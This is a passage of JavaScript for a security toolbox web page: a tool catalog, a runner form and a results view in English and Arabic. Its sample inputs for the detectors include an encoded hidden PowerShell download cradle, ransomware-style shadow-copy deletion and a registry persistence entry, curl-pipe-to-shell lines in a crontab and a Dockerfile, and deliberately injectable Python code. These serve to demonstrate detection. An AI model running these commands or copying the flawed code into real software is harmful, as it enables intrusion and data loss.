/* The Toolbox (#/toolbox): the CyberScan security tools (Tools/, served by web_v/toolbox.py).
 *
 *   - a live constellation: one node per category orbiting a core, always in motion (time-driven,
 *     never scroll-driven); clicking a node filters the catalog;
 *   - the catalog: category chips, instant search, cards that rearrange with a FLIP animation;
 *   - the runner: a form built from each tool's own INPUT_SCHEMA (files become drop zones and are
 *     sent as base64; headers become "Name: value" lines; lists become one item per line), and a
 *     one-click example for every common input, so each tool can be tried at once;
 *   - the analysis stage: a scan beam, a ring and a log that types while the server works;
 *   - the result: the classification, a risk dial that fills and counts, findings by severity
 *     (each with its explanation, recommendation and evidence), and the raw JSON.
 * Tool names and descriptions come from the tools themselves (English); the interface around
 * them is translated. Reduced motion: the same content, without the motion. */
(function () {
  "use strict";
  const CS = window.CS;
  const view = document.getElementById("view-toolbox");
  if (!CS || !view) return;
  const { $, el, t, api } = CS;
  const reduced = () => matchMedia("(prefers-reduced-motion: reduce)").matches || document.documentElement.classList.contains("reduce-motion");

  /* ---------- text ---------- */
  const I = window.I18N;
  const STR = {
    en: { navToolbox: "Toolbox", tbTitle: "The CyberScan Toolbox", tbLede: "Real security tools, ready to run: files, malware, email, links, websites, code, cloud and privacy. Each one analyses only what you give it and never runs a file.",
      tbTools: "tools", tbCats: "categories", tbAll: "All", tbSearch: "Search the tools…", tbNone: "No tool matches this search.", tbRun: "Run the analysis", tbRunning: "Analysing…",
      tbExample: "Try an example", tbClose: "Close", tbBack: "All tools", tbPick: "Choose a file", tbDrop: "Drop a file here or click to choose", tbOrText: "or paste text instead",
      tbPrivacyLocal: "Never runs files", tbPrivacyNet: "No network access", tbPublicNote: "On the public website, {n} tools that inspect the machine they run on, or connect to addresses you type, are available in the desktop app only.",
      tbResult: "Result", tbFindings: "Findings", tbNoFindings: "No warning signs in what was given.", tbEvidence: "Evidence", tbRaw: "Raw output (JSON)", tbCopy: "Copy JSON", tbCopied: "Copied",
      tbRisk: "Risk", tbIn: "in {ms} ms", tbErr: "The tool could not finish", tbAgain: "Run again", tbFix: "Recommendation", tbLines: "one per line", tbHeaders: "one header per line: Name: value", tbJson: "JSON",
      tbVersion: "version", tbCls: { clean: "No warning signs", suspicious: "Suspicious", malicious: "Malicious", unknown: "Inconclusive", review: "Worth a review", error: "Error", partial: "Partial check" },
      tbSev: { critical: "Critical", high: "High", medium: "Medium", low: "Low", info: "Info" },
      tbLog: ["validating the input against the tool's schema", "checking the tool's approved fingerprint", "loading the reviewed analyzer", "analysing", "validating the result"],
      tbRequired: "Fill in this field.", tbFixFields: "Some required fields are empty: they are marked below.", tbNeedOne: "Fill in at least one field, or press “Try an example”.",
      tbFieldProblem: "The tool couldn't accept “{f}”. Check it and try again.", tbBadInput: "The tool couldn't accept this input. Check the fields marked * and try again.",
      tbRejectedTitle: "Nothing was checked", tbNeedOneOf: "This tool needs at least one of: {f}.", tbInconclusive: "The tool couldn't reach a conclusion from what it was given.",
      tbFilePath: "File name", tbFilePathPh: "for example .github/workflows/ci.yml", tbFileContent: "Paste the file's contents here", tbAddFile: "Add another file", tbPickFiles: "Choose files…", tbRemoveFile: "Remove this file",
      tbFileN: "File {n}",
      tbByUse: "By what you want to do", tbByCat: "By category", tbExLabel: "Example:", tbExFile: "a sample file", tbExFiles: "a sample {f}",
      tbPasteOnly: "Paste-only on the website", tbPasteNote: "Here this tool reads only what you paste (an export or a list). Reading this computer itself works in the desktop app.",
      tbUses: [["link", "Check a link or a website", "Before you click, or before you trust a site"], ["email", "Check an email", "Is this message really from who it says?"],
        ["file", "Check a file", "Documents, programs and archives, read and never run"], ["privacy", "Protect my privacy", "Find personal data, keys and trackers before you share"],
        ["code", "Audit my code", "Common security mistakes, secrets and risky dependencies"], ["cloud", "Secure my cloud", "Configs for AWS, Docker, Kubernetes and CI"],
        ["network", "Check my network", "Flows, configs and exposed services"], ["system", "Review my computer's setup", "Paste an export: tasks, start-up entries, firewall, updates"]] },
    ar: { navToolbox: "صندوق الأدوات", tbTitle: "صندوق أدوات CyberScan", tbLede: "أدوات أمنية حقيقية جاهزة للتشغيل: الملفات والبرمجيات الخبيثة والبريد والروابط والمواقع والكود والسحابة والخصوصية. كل أداة تحلّل ما تعطيها فقط، ولا تشغّل أي ملف.",
      tbTools: "أداة", tbCats: "فئة", tbAll: "الكل", tbSearch: "ابحث في الأدوات…", tbNone: "لا توجد أداة تطابق هذا البحث.", tbRun: "شغّل التحليل", tbRunning: "جارٍ التحليل…",
      tbExample: "جرّب مثالًا", tbClose: "إغلاق", tbBack: "كل الأدوات", tbPick: "اختر ملفًا", tbDrop: "أفلت ملفًا هنا أو انقر للاختيار", tbOrText: "أو الصق نصًا بدلًا منه",
      tbPrivacyLocal: "لا يشغّل الملفات", tbPrivacyNet: "دون اتصال بالشبكة", tbPublicNote: "في الموقع العام، {n} أدوات تفحص الجهاز الذي تعمل عليه أو تتصل بعناوين تكتبها، متاحة في تطبيق سطح المكتب فقط.",
      tbResult: "النتيجة", tbFindings: "ما وُجد", tbNoFindings: "لا علامات تحذير فيما أُعطي للأداة.", tbEvidence: "الأدلة", tbRaw: "المخرجات الخام (JSON)", tbCopy: "انسخ JSON", tbCopied: "نُسخ",
      tbRisk: "الخطورة", tbIn: "في {ms} مللي ثانية", tbErr: "لم تتمكن الأداة من الإكمال", tbAgain: "شغّل مجددًا", tbFix: "التوصية", tbLines: "عنصر في كل سطر", tbHeaders: "ترويسة في كل سطر: الاسم: القيمة", tbJson: "JSON",
      tbVersion: "الإصدار", tbCls: { clean: "لا علامات تحذير", suspicious: "مشبوه", malicious: "ضار", unknown: "غير حاسم", review: "يستحق المراجعة", error: "خطأ", partial: "فحص جزئي" },
      tbSev: { critical: "حرج", high: "مرتفع", medium: "متوسط", low: "منخفض", info: "معلومة" },
      tbLog: ["التحقق من المدخلات مقابل مخطط الأداة", "التحقق من البصمة المعتمدة للأداة", "تحميل المحلّل المُراجَع", "التحليل", "التحقق من النتيجة"],
      tbRequired: "املأ هذا الحقل.", tbFixFields: "بعض الحقول المطلوبة فارغة: هي معلّمة أدناه.", tbNeedOne: "املأ حقلًا واحدًا على الأقل، أو اضغط «جرّب مثالًا».",
      tbFieldProblem: "تعذّر على الأداة قبول «{f}». تحقق منه ثم أعد المحاولة.", tbBadInput: "تعذّر على الأداة قبول هذه المدخلات. تحقق من الحقول المعلّمة بـ * ثم أعد المحاولة.",
      tbRejectedTitle: "لم يُفحص شيء", tbNeedOneOf: "تحتاج هذه الأداة إلى واحد على الأقل من: {f}.", tbInconclusive: "لم تتمكن الأداة من الوصول إلى نتيجة مما أُعطي لها.",
      tbFilePath: "اسم الملف", tbFilePathPh: "مثلًا .github/workflows/ci.yml", tbFileContent: "الصق محتوى الملف هنا", tbAddFile: "أضف ملفًا آخر", tbPickFiles: "اختر ملفات…", tbRemoveFile: "أزل هذا الملف",
      tbFileN: "الملف {n}",
      tbByUse: "حسب ما تريد فعله", tbByCat: "حسب الفئة", tbExLabel: "مثال:", tbExFile: "ملف تجريبي", tbExFiles: "ملف {f} تجريبي",
      tbPasteOnly: "باللصق فقط في الموقع", tbPasteNote: "هنا تقرأ هذه الأداة ما تلصقه فقط (تصدير أو قائمة). أما قراءة هذا الجهاز نفسه فمتاحة في تطبيق سطح المكتب.",
      tbUses: [["link", "افحص رابطًا أو موقعًا", "قبل أن تنقر، أو قبل أن تثق بموقع"], ["email", "افحص رسالة بريد", "هل الرسالة حقًا ممن تدّعي؟"],
        ["file", "افحص ملفًا", "مستندات وبرامج وأرشيفات، تُقرأ ولا تُشغَّل"], ["privacy", "احمِ خصوصيتك", "اعثر على البيانات الشخصية والمفاتيح والمتتبّعات قبل المشاركة"],
        ["code", "دقّق الكود", "أخطاء أمنية شائعة وأسرار واعتماديات خطرة"], ["cloud", "أمّن السحابة", "إعدادات AWS وDocker وKubernetes وCI"],
        ["network", "افحص شبكتك", "تدفقات وإعدادات وخدمات مكشوفة"], ["system", "راجع إعداد جهازك", "الصق تصديرًا: المهام وبرامج بدء التشغيل والجدار الناري والتحديثات"]] },
  };
  if (I && I.en && I.ar) { Object.assign(I.en, { navToolbox: STR.en.navToolbox }); Object.assign(I.ar, { navToolbox: STR.ar.navToolbox }); }
  const L = () => STR[CS.lang === "ar" ? "ar" : "en"];
  const CATS = {
    "file-security": { ar: "أمن الملفات", en: "File security", hue: 190, icon: "M14 3H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V8zM14 3v5h5" },
    "malware-analysis": { ar: "تحليل البرمجيات الخبيثة", en: "Malware analysis", hue: 330, icon: "M12 8v8M8 12h8M12 3a9 9 0 1 0 0 18 9 9 0 0 0 0-18z" },
    "email-security": { ar: "أمن البريد", en: "Email security", hue: 265, icon: "M4 6h16v12H4zM4 7l8 6 8-6" },
    "url-domain-security": { ar: "الروابط والنطاقات", en: "Links and domains", hue: 175, icon: "M10 14a4 4 0 0 0 5.7 0l3-3a4 4 0 0 0-5.7-5.7l-1 1M14 10a4 4 0 0 0-5.7 0l-3 3a4 4 0 0 0 5.7 5.7l1-1" },
    "website-security": { ar: "أمن المواقع", en: "Website security", hue: 210, icon: "M3 5h18v14H3zM3 9h18M7 7h.01" },
    "code-dependency-security": { ar: "الكود والاعتماديات", en: "Code and dependencies", hue: 140, icon: "M8 7l-5 5 5 5M16 7l5 5-5 5M14 4l-4 16" },
    "privacy-data-protection": { ar: "الخصوصية وحماية البيانات", en: "Privacy and data", hue: 45, icon: "M12 3 4.5 6v5.5c0 4.6 3.2 8.4 7.5 9.5 4.3-1.1 7.5-4.9 7.5-9.5V6zM10 12h4" },
    "cloud-infrastructure": { ar: "السحابة والبنية التحتية", en: "Cloud and infrastructure", hue: 200, icon: "M7 18a4 4 0 0 1-.5-8 6 6 0 0 1 11.5 1.5A3.5 3.5 0 0 1 17.5 18z" },
    "network-security": { ar: "أمن الشبكات", en: "Network security", hue: 100, icon: "M5 12a7 7 0 0 1 14 0M8.5 12a3.5 3.5 0 0 1 7 0M12 12v8" },
    "system-security": { ar: "أمن النظام", en: "System security", hue: 15, icon: "M4 5h16v11H4zM9 20h6M12 16v4" },
    "file-analysis": { ar: "فحص الملفات", en: "File inspection", hue: 230, icon: "M11 4a7 7 0 1 0 0 14 7 7 0 0 0 0-14zM16 16l4.5 4.5" },
  };
  // "File inspection" held a single tool: it belongs with the other file tools
  const catOf = (tool) => (tool.category === "file-analysis" ? "file-security" : tool.category);
  // a few tools describe themselves in developer terms: the same facts in plain words
  const PLAIN_EN = {
    "cyberscan.email.email_phishing_detector": "Checks the text of an email for the warning signs of phishing: urgent pressure, look-alike senders and deceptive links.",
    "cyberscan.email.email_spoofing_detector": "Checks an email's sender and authentication headers (SPF, DKIM, DMARC) for signs that the sender is faked.",
    "cyberscan.email.email_url_extractor": "Lists every link in an email and flags the risky ones, without opening any of them.",
    "cyberscan.email.dkim_validator": "Checks that a DKIM signature header and its public-key record have the required parts. It does not verify the message's signature itself.",
    "cyberscan.file.inspection": "Checks a file for warning signs with CyberScan's static analysis. The file is read in memory and never opened or run.",
    "cyberscan.file.embedded_payload_detector": "Looks for another file hidden inside this one (a program inside a picture or a document, for example).",
    "cyberscan.file.entropy_analyzer": "Measures how random a file's bytes are. Very random data can mean encryption or packing, which is worth a review.",
    "cyberscan.file.hash_analyzer": "Calculates a file's fingerprints (MD5, SHA-1, SHA-256) so you can compare it with a known copy.",
    "cyberscan.file.macro_security_analyzer": "Finds macros in Word, Excel and PowerPoint files and checks them for risky behaviour.",
    "cyberscan.malware.malware_indicator_analyzer": "Checks a file for the warning signs of malware with CyberScan's static analysis, without running it.",
    "cyberscan.malware.yara_rule_scanner": "Runs YARA rules you write against a file, in memory, without running the file.",
    "cyberscan.url.domain_reputation_analyzer": "Checks a domain name for the patterns phishing sites use. It does not look the domain up online.",
    "cyberscan.url.homograph_attack_detector": "Finds look-alike web addresses that use letters from other alphabets to imitate a known brand.",
    "cyberscan.url.phishing_url_detector": "Checks a link for the warning signs of a phishing page, without opening it.",
    "cyberscan.url.url_reputation_analyzer": "Checks a link for risky patterns, without opening it. No online reputation service is asked.",
    "cyberscan.code.sql-injection": "Finds database queries built by gluing text together instead of using parameters, in Python, JavaScript, PHP, Java, C#, Go and Ruby.",
    "cyberscan.code.source-scanner": "Finds common security mistakes in source code: injection, disabled certificate checks, weak cryptography, debug mode and unsafe temporary files.",
    "cyberscan.network.anomaly-analyzer": "Finds port scans, beaconing, DNS tunnelling and unusual outbound traffic in exported network flow records. These are warning signs, not proof of an attack.",
  };
  // the tools' own texts are English; Arabic comes from js/toolbox-ar.js when the page is Arabic
  const AR = () => (CS.lang === "ar" && window.TOOLBOX_AR) || null;
  const tName = (tool) => { const a = AR(); return (a && a.tools[tool.id] && a.tools[tool.id][0]) || tool.name; };
  const tDesc = (tool) => { const a = AR(); return (a && a.tools[tool.id] && a.tools[tool.id][1]) || PLAIN_EN[tool.id] || tool.description; };
  const fName = (name) => { const a = AR(); return (a && a.fields[name]) || name.replace(/_/g, " "); };
  // the tools map: what people want to do, not how the tools are filed
  const USE_OF = { "url-domain-security": "link", "website-security": "link", "email-security": "email", "file-security": "file", "file-analysis": "file",
    "malware-analysis": "file", "privacy-data-protection": "privacy", "code-dependency-security": "code", "cloud-infrastructure": "cloud",
    "network-security": "network", "system-security": "system" };
  const catName = (c) => (CATS[c] ? CATS[c][CS.lang === "ar" ? "ar" : "en"] : c);
  const catHue = (c) => (CATS[c] ? CATS[c].hue : 200);
  const svgIcon = (d) => { const s = document.createElementNS("http://www.w3.org/2000/svg", "svg"); s.setAttribute("viewBox", "0 0 24 24"); s.setAttribute("aria-hidden", "true"); const p = document.createElementNS("http://www.w3.org/2000/svg", "path"); p.setAttribute("d", d); s.append(p); return s; };

  /* ---------- examples for common inputs (so every tool can be tried at once) ---------- */
  const enc = (s) => btoa(unescape(encodeURIComponent(s)));
  const EX = {
    url: "http://paypa1-secure-login.com.verify-account.xyz/login?session=reset",
    domain: "secure-paypa1-login.com", zone: "example.com",
    message: "From: \"PayPal Support\" <alert@paypa1-security.xyz>\nReply-To: refund@mailbox-help.top\nTo: you@example.com\nSubject: Urgent: your account will be suspended\nAuthentication-Results: spf=fail dkim=none dmarc=fail\n\nDear customer, verify your account within 24 hours or it will be closed:\nhttp://paypa1-secure-login.com.verify-account.xyz/login\n",
    headers: { Server: "Apache/2.4.29 (Ubuntu)", "X-Powered-By": "PHP/7.2.24", "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Credentials": "true" },
    spf_record: "v=spf1 include:_spf.google.com +all", dmarc_record: "v=DMARC1; p=none; pct=50",
    content_security_policy: "default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval' http:",
    set_cookie: "sessionid=4f9a1c2e; Path=/; SameSite=None",
    html: "<html><body><script src=\"http://cdn.example.com/app.js\"></script><img src=\"http://img.example.com/a.png\"></body></html>",
    security_txt: "Contact: mailto:security@example.com\n",
    script: "$c = 'SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAGEAJwApAA=='\npowershell -NoP -W Hidden -Enc $c\n",
    content: "Your files have been encrypted! To recover them send 0.5 BTC to the wallet below.\nvssadmin delete shadows /all /quiet\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upd /d C:\\Users\\Public\\upd.exe\n",
    text: "aws_access_key_id = AKIAIOSFODNN7EXAMPLE\npassword = \"hunter2\"\ncontact: jane.doe@example.com, +1 202 555 0147\n",
    file_name: "invoice_2026.pdf.exe", tls_version: "TLSv1.0", cipher: "TLS_RSA_WITH_RC4_128_SHA",
    data_base64: enc("%PDF-1.7\n1 0 obj << /Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert('hi');) >> >>\nendobj\n%%EOF\nMZ hidden after EOF"),
    redirects: ["http://bit.ly/3xYz", "http://tracker.example.net/r?id=1", "http://paypa1-secure-login.com.verify-account.xyz/login"],
    brands: ["PayPal", "Microsoft"],
    code: "import os, pickle, sqlite3\nfrom flask import request\n\ndef user():\n    q = \"SELECT * FROM users WHERE id = \" + request.args[\"id\"]\n    sqlite3.connect(\"app.db\").execute(q)\n    data = pickle.loads(request.data)\n    os.system(\"ping \" + request.args[\"host\"])\n    return \"<div>\" + request.args[\"name\"] + \"</div>\"\n\nAPI_KEY = \"EXAMPLE-NOT-A-REAL-KEY\"\n",
  };
  const CERT = "-----BEGIN CERTIFICATE-----\nMIICTDCCAbWgAwIBAgIUB7HLY3fPiqVwGvHk2mRkYa63aW4wDQYJKoZIhvcNAQEL\nBQAwODEkMCIGA1UEAwwbcGF5cGExLXNlY3VyZS1sb2dpbi5leGFtcGxlMRAwDgYD\nVQQKDAdFeGFtcGxlMB4XDTI2MTExNzE5MzYxN1oXDTI2MTIxNzE5MzYxN1owODEk\nMCIGA1UEAwwbcGF5cGExLXNlY3VyZS1sb2dpbi5leGFtcGxlMRAwDgYDVQQKDAdF\neGFtcGxlMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQD25vJTOx/WMqiGmb9t\nnQ1lKCitB3HHKFFm/pEF6Qbbw5UfjxpN+1NLpOmPYfV9shQF5zdVAABh/izSFgFS\naI7x10d+ke9Mj1XQWFTbdRCaKDRWvXxarDzjlk7fJ5Of3Zi+cavSH1R9HNKBTpdL\nizYwPjUolXJEWiQNFlSpYx3kaQIDAQABo1MwUTAdBgNVHQ4EFgQU33lHCZMLoZsC\nZQABoA0h6Yd8BGUwHwYDVR0jBBgwFoAU33lHCZMLoZsCZQABoA0h6Yd8BGUwDwYD\nVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOBgQDnmayVGRmJSsrMbXVO8t2e\nSPKuNFxHIx2nQii2h2zRQs3MnIK+YRMV0iM1tSBX+Lm17eXhK3OqqA+4+u8nlULY\nIfVybMXRnrxwUjJ0VXvlkm3+BeSHRRzgeSciC2eFG+rr8TBdk6KuwwH55BO3oSD0\nQ7tI1xVSl8uReJtDdNp/TQ==\n-----END CERTIFICATE-----";
  const PUBKEY = "-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDdrgRbfDyPj5St2uKFiyadRJlJ\nYDuV+X3YHMC7YJOGdhBge1VK2Hoj4UcaigDvs9Rl3O4H4spaQAZFimypiEVWl1Pp\nz+Ip53UVKHqCjy1pdLTeMZ43yfJATDImqG67ARa1X1Vy/QHBUN6z/L7ekZS6eVgZ\nk/zMIy00mXBpbk+t9QIDAQAB\n-----END PUBLIC KEY-----";
  const SIG = "C23REltvKStCaj+Ruu7cFAp/i1R4ngm/KhIH1TlU0TNMoixORrclOH6sUCXdQWojn0Np0OufOVXVHyX0Aj+Zk14+9asCrtNAMHZPb2uKQ51Y2mt4a/b42hcMz+opExX33bbupis53Shqj0qz0H4hxk21O2jAMvZFa7IPG4djBs8=";
  const FILES = {
    "cyberscan.cloud.cicd-config": [{ path: ".github/workflows/ci.yml", content: "on: pull_request_target\npermissions: write-all\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@main\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - run: echo \"${{ github.event.pull_request.title }}\"\n" }],
    "cyberscan.cloud.container-config": [{ path: "Dockerfile", content: "FROM ubuntu:latest\nUSER root\nENV API_KEY=EXAMPLE-NOT-A-REAL-KEY\nRUN curl -s http://example.com/install.sh | sh\nEXPOSE 22\n" }],
    "cyberscan.cloud.iac-scanner": [{ path: "main.tf", content: "resource \"aws_security_group\" \"web\" {\n  ingress {\n    from_port = 22\n    to_port = 22\n    protocol = \"tcp\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n}\nresource \"aws_s3_bucket\" \"logs\" {\n  bucket = \"company-logs\"\n  acl = \"public-read\"\n}\n" }],
    "cyberscan.cloud.kubernetes-auditor": [{ path: "pod.yaml", content: "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\nspec:\n  hostNetwork: true\n  containers:\n    - name: web\n      image: nginx:latest\n      securityContext:\n        privileged: true\n" }],
    "cyberscan.code.dependency-vulnerabilities": [{ path: "requirements.txt", content: "django==2.2.0\nrequests==2.19.0\nflask\n" }],
    "cyberscan.code.lockfile-integrity": [{ path: "requirements.txt", content: "django>=2.0\nrequests\ngit+http://example.com/lib.git#egg=lib\n" }],
    "cyberscan.code.sbom-generator": [{ path: "requirements.txt", content: "django==4.2.7\nrequests==2.31.0\n" }],
    "cyberscan.code.license-compliance": [{ path: "package.json", content: "{\"name\": \"app\", \"license\": \"MIT\", \"dependencies\": {\"left-pad\": \"1.3.0\"}}" }],
    "cyberscan.code.secrets-scanner": [{ path: ".env", content: "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nDB_PASSWORD=hunter2\n" }],
    "cyberscan.cloud.config-analyzer": [{ path: "security-groups.json", content: "{\"SecurityGroups\": [{\"GroupId\": \"sg-1\", \"IpPermissions\": [{\"FromPort\": 22, \"ToPort\": 22, \"IpProtocol\": \"tcp\", \"IpRanges\": [{\"CidrIp\": \"0.0.0.0/0\"}]}]}]}" }],
    "cyberscan.system.persistence-auditor": [{ path: "crontab", content: "@reboot curl -s http://198.51.100.7/a.sh | sh\n" }],
  };
  const EX_BY_TOOL = {
    "cyberscan.cloud.backup-config": { policy: "{\"name\": \"daily\", \"copies\": 1, \"offsite\": false, \"encrypted\": false, \"immutable\": false, \"retention_days\": 3}" },
    "cyberscan.cloud.asset-exposure": { assets: [{ id: "i-1", type: "instance", public_ip: "203.0.113.10", open_ports: [22, 3389, 5432], tags: {} }] },
    "cyberscan.cloud.iam-auditor": { policies: [{ name: "AdminEverything", kind: "identity", document: "{\"Version\": \"2012-10-17\", \"Statement\": [{\"Effect\": \"Allow\", \"Action\": \"*\", \"Resource\": \"*\"}]}" }] },
    "cyberscan.code.license-compliance": { packages: [{ name: "gpl-lib", version: "1.0", license: "GPL-3.0" }, { name: "left-pad", version: "1.3.0", license: "MIT" }] },
    "cyberscan.email.dkim_validator": { dkim_signature: "v=1; a=rsa-sha256; d=example.com; s=mail; h=from:to:subject; bh=abc=; b=def=", public_key_record: "v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC" },
    "cyberscan.email.email_attachment_risk_analyzer": { attachments: [{ file_name: "invoice_2026.pdf.exe", content_type: "application/pdf" }, { file_name: "photo.jpg", content_type: "image/jpeg" }] },
    "cyberscan.file.digital_certificate_inspector": { certificate_pem: CERT },
    "cyberscan.url.ssl_certificate_inspector": { certificate_pem: CERT },
    "cyberscan.file.digital_signature_validator": { file_base64: enc("hello"), signature_base64: SIG, public_key_pem: PUBKEY, algorithm: "rsa-pkcs1v15-sha256" },
    "cyberscan.malware.yara_rule_scanner": { rules: "rule EncodedPowerShell {\n  strings:\n    $a = \"-enc\" nocase\n    $b = \"powershell\" nocase\n  condition:\n    all of them\n}" , data_base64: enc("powershell -nop -w hidden -enc SQBFAFgA") },
    "cyberscan.network.service-exposure": { listening: "Proto Local Address State\nTCP 0.0.0.0:3389 LISTENING\nTCP 0.0.0.0:445 LISTENING\nTCP 127.0.0.1:5432 LISTENING\n" },
    "cyberscan.system.local-permissions": { ls_output: "-rwsr-xr-x 1 root root 12345 Jan 1 10:00 /usr/local/bin/helper\n-rw-rw-rw- 1 root root 220 Jan 1 10:00 /etc/app.conf\n-rw-r--r-- 1 user user 1675 Jan 1 10:00 /home/user/.ssh/id_rsa\n" },
    "cyberscan.url.dns_record_analyzer": { records: ["example.com. 300 IN TXT \"v=spf1 +all\"", "_dmarc.example.com. 300 IN TXT \"v=DMARC1; p=none\""] },
    "cyberscan.system.firewall-config": { ufw: "Status: active\nDefault: allow (incoming), allow (outgoing), disabled (routed)\n\nTo                         Action      From\n--                         ------      ----\n22/tcp                     ALLOW IN    Anywhere\n3389/tcp                   ALLOW IN    Anywhere\n" },
    "cyberscan.system.scheduled-tasks": { crontab: "*/5 * * * * curl -s http://198.51.100.7/a.sh | sh\n0 3 * * * /usr/bin/backup.sh\n" },
    "cyberscan.system.config-auditor": { sysctl: "net.ipv4.ip_forward = 1\nkernel.randomize_va_space = 0\nnet.ipv4.conf.all.accept_redirects = 1\n" },
    "cyberscan.system.installed-software": { software: [{ name: "Adobe Flash Player", version: "32.0.0.371", publisher: "Adobe" }, { name: "7-Zip", version: "9.20", publisher: "Igor Pavlov" }] },
    "cyberscan.system.update-status": { os_release: "NAME=\"Ubuntu\"\nVERSION_ID=\"18.04\"\n", apt_upgradable: "openssl/bionic-security 1.1.1-1ubuntu2.1~18.04.23 amd64 [upgradable from: 1.1.1-1ubuntu2.1~18.04.5]\n" },
    "cyberscan.url.domain_expiration_checker": { expires_at: new Date(Date.now() + 9 * 86400000).toISOString().slice(0, 10) },
  };
  function example(name, schema, tool) {
    const cat = tool ? tool.category : "";
    if (tool && EX_BY_TOOL[tool.id] && name in EX_BY_TOOL[tool.id]) return EX_BY_TOOL[tool.id][name];
    if (tool && (name === "files" || name === "documents") && FILES[tool.id]) return FILES[tool.id];
    if (name === "content" && cat === "code-dependency-security") return EX.code;
    if (name === "content" && cat === "privacy-data-protection") return EX.text;
    if (name in EX) {
      const v = EX[name];
      if (schema.type === "array" && typeof v === "string") return [v];
      return v;
    }
    if (/base64$/.test(name)) return EX.data_base64;
    if (/url/.test(name)) return EX.url;
    if (/domain|host/.test(name)) return EX.domain;
    if (schema.type === "string" && /text|content|source|code|log|config|document/.test(name)) return EX.text;
    return undefined;
  }

  /* ---------- state ---------- */
  let catalog = null, filterCat = "all", query = "", loaded = false, current = null;
  const grid = el("div", "tb-grid");

  /* ---------- the page ---------- */
  view.replaceChildren();
  const shell = el("section", "card tb");
  const head = el("div", "tb-head");
  const headText = el("div", "tb-head-text");
  const h1 = el("h1", "tb-title"); const lede = el("p", "lede tb-lede");
  const stats = el("div", "tb-stats");
  const sTools = el("div", "tb-stat"); const sCats = el("div", "tb-stat");
  stats.append(sTools, sCats);
  headText.append(h1, lede, stats);
  const constel = el("canvas", "tb-constellation"); constel.setAttribute("aria-hidden", "true");
  head.append(headText, constel);
  const bar = el("div", "tb-bar");
  const chips = el("div", "tb-chips"); chips.setAttribute("role", "tablist");
  const search = el("input", "tb-search"); search.type = "search";
  bar.append(chips, search);
  const note = el("p", "tb-note"); note.hidden = true;
  const modeBox = el("div", "tb-mode-box");
  let viewMode = "use";
  const mapBox = el("div", "tb-map");
  const empty = el("p", "tb-empty"); empty.hidden = true;
  const runner = el("div", "tb-runner"); runner.hidden = true;
  shell.append(head, modeBox, bar, note, mapBox, grid, empty);
  view.append(shell, runner);

  function paintHead() {
    const l = L();
    h1.textContent = l.tbTitle; lede.textContent = l.tbLede; search.placeholder = l.tbSearch; search.setAttribute("aria-label", l.tbSearch);
    empty.textContent = l.tbNone;
    if (catalog) {
      const cats = new Set(catalog.tools.map(catOf));
      stat(sTools, catalog.tools.length, l.tbTools); stat(sCats, cats.size, l.tbCats);
      note.hidden = !catalog.hidden; note.textContent = l.tbPublicNote.replace("{n}", catalog.hidden);
    }
  }
  function stat(box, n, label) {
    box.replaceChildren(el("b", "", "0"), el("span", "", label));
    const b = box.querySelector("b");
    if (reduced()) { b.textContent = n; return; }
    const t0 = performance.now();
    const step = (now) => { const k = Math.min(1, (now - t0) / 1200); b.textContent = Math.round(n * (1 - Math.pow(1 - k, 3))); if (k < 1) requestAnimationFrame(step); };
    requestAnimationFrame(step);
  }

  function buildChips() {
    const cats = [...new Set(catalog.tools.map(catOf))];
    const make = (key, label, hue) => {
      const b = el("button", "tb-chip" + (key === filterCat ? " on" : ""), label); b.type = "button"; b.setAttribute("role", "tab");
      b.setAttribute("aria-selected", String(key === filterCat)); b.style.setProperty("--h", hue);
      if (key !== "all") { b.prepend(svgIcon(CATS[key] ? CATS[key].icon : "")); b.append(el("small", "", String(catalog.tools.filter((x) => catOf(x) === key).length))); }
      b.addEventListener("click", () => setFilter(key));
      return b;
    };
    chips.replaceChildren(make("all", L().tbAll, 200), ...cats.map((c) => make(c, catName(c), catHue(c))));
    // the map (grouped by use) or the flat catalog
    const seg = el("div", "tb-mode"); seg.setAttribute("role", "group");
    [["use", L().tbByUse], ["cat", L().tbByCat]].forEach(([k, label]) => {
      const b = el("button", `tb-mode-btn${viewMode === k ? " on" : ""}`, label); b.type = "button"; b.setAttribute("aria-pressed", String(viewMode === k));
      b.addEventListener("click", () => { viewMode = k; if (k === "use") filterCat = "all"; buildChips(); renderGrid(); });
      seg.append(b);
    });
    modeBox.replaceChildren(seg);
  }
  function setFilter(key) {
    filterCat = key;
    buildChips(); renderGrid(); if (window.CSSfx) CSSfx.play("soft");
  }

  /* cards, rearranged with FLIP so filtering feels physical */
  const cardFor = new Map();
  function card(tool) {
    if (cardFor.has(tool.id)) return cardFor.get(tool.id);
    const c = el("button", "tb-card"); c.type = "button";
    c.style.setProperty("--h", catHue(tool.category));
    const ico = el("span", "tb-card-ico"); ico.append(svgIcon(CATS[tool.category] ? CATS[tool.category].icon : ""));
    const body = el("span", "tb-card-body");
    const nm = el("b", "tb-card-name", tName(tool)), ds = el("span", "tb-card-desc", tDesc(tool));
    nm.dir = ds.dir = "auto";                                  // tool texts are English: keep their own direction
    body.append(nm, ds);
    const exText = usageExample(tool);
